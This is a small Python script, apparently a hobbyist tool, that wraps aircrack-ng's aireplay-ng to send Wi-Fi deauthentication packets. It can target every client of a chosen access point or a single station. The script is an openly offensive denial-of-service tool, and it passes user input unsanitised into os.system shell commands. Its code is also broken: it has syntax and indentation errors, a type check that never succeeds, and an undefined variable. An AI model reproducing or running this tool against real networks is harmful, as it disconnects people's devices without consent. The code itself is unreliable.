#Wifi_Deauthenticator
import os
os.system('clear')
print("Welcome to Wifi De-Authenticator \n Make sure aircrack-ng suite is installed\n and You are running this as Root \n Press CTRL+C to Exit anytime you want")
input()
os.system("clear")
os.system("iwconfig")
input()
os.system("clear")
interface_in_mon = input("Enter Interface to Use (Monitoring Wlan Adapter): ")
os.system('clear')
os.system(f'iw {interface_in_mon} scan | grep "BSS" ')
input()
router_bssid = input("Enter Wifi BSSID: ")
print(f"BSSID {router_bssid} Selected")
cmd = input("""Send DeAuth to [A]ll or Send to a [S]tation : """)
cmd = cmd.lower()
if cmd == 'a':
    while(1):
        numberofpackets = input("How many packet's you would like to send ? : ")
        if(type(numberofpackets) != int):
            print("Lol, give a valid number you asshole !")
        else:
            break
    print("DeAuthenticating All Clients")
    command = f'aireplay-ng --deauth {numberofpackets} -a {router_bssid} {interface_in_mon}'
    print("1")
    print("2")
    print("3"..)
    os.system("sleep 2")
    print("POOOOOOOOWWWWWWWWWWEEEEEEEERRRRRR !!!!!!!!!!!")
    os.system(command)
elif cmd == 's':
    station_mac = input("Enter the Mac ID of the Station: ")
        while(1):
        numberofpackets = input("How many packet's you would like to send ? : ")
        if(type(numberpacket) != int):
            print("Lol, give a valid number you asshole !")
    print(f"Sending DeAuthentication Packet to Station : '{station_mac}'")       
    command = f'aireplay-ng --deauth {numberofpackets} -a {router_bssid} -c {station_mac} {interface_in_mon}'
    print("1")
    print("2")
    print("3"..)
    os.system("sleep 2")
    print("POOOOOOOOWWWWWWWWWWEEEEEEEERRRRRR !!!!!!!!!!!")
    os.system(command)
else:
    print("Invalid Option: Quiting the Session!")